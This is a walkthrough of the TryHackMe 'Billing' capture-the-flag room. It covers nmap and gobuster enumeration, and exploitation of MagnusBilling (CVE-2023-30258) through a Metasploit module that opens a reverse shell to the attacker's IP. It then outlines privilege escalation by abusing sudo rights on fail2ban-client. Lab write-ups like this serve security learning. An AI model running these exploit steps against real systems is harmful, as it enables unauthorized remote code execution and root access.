# Billing CTF TryHackMe

## Step 1: Nmap Scan

I ran an nmap scan on the ip with this command `nmap -A <target-ip>` and yielded these results in return:


![Screenshot 2025-03-09 001847](https://github.com/user-attachments/assets/fda6dfc4-b482-43de-8b11-79465059d1ea)


From this scan we can see SSH is open. I also see that port 80 is running MagnusBilling and port 3306 is running MariaDB.

## Step 2: Enumerate Some More

After running the Nmap scan I ran gobuster to find any directories we may not know about using this command: `gobuster dir -u http://10.10.2.151 -w /usr/share/wordlists/dirb/common.txt`

Doing this revealed these directories: 

![Screenshot 2025-03-09 002404](https://github.com/user-attachments/assets/a2c0bb38-84a7-4bee-8dfe-ed69a4c77fb5)


## Step 3: Finding an exploit

Knowing that MagnusBilling was being used on here I searched for common exploits and found CVE-2023-30258. The first link of the google search "magnus billing exploits" brought me to this page -> 
https://www.rapid7.com/db/modules/exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258/

This was fantastic because it showed me how to create a reverse shell using Metasploit. Below will be the commands I used to start a reverse shell:

```
use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258

set RHOSTS <target-ip>

set LHOSTS <attackers-ip>

exploit
```

The shell works as seen below:

![Screenshot 2025-03-09 003258](https://github.com/user-attachments/assets/1edfcea7-19d5-43b1-90be-df64805a43b2)

## Step 4: Finding Users.txt

This is probably the most simple part of the CTF as all you need to do is look around the system, I found users.txt in /home/magnus.

![Screenshot 2025-03-09 003456](https://github.com/user-attachments/assets/5bcfbfbd-87f8-4140-a756-a9a0b53adab4)

Don't just copy me, find it yourself. 😓

## Step 5: Priv Esc and finding the Root flag

Using `sudo -l` saves so much time when trying to figure how to get a privilige escalation 

If `sudo -l` didn't work for you like it did for me type `shell` into your meterpreter and it should be fixed.

Anyways, after using that command we can see that our user can run all commands with the fail2ban-client. So, we want to be able to have the fail2ban client read root.txt and store it in a location that
we can access as the user we currently are.

![Screenshot 2025-03-09 005105](https://github.com/user-attachments/assets/d013ab47-9b8e-4644-b134-c4621fbb5149)


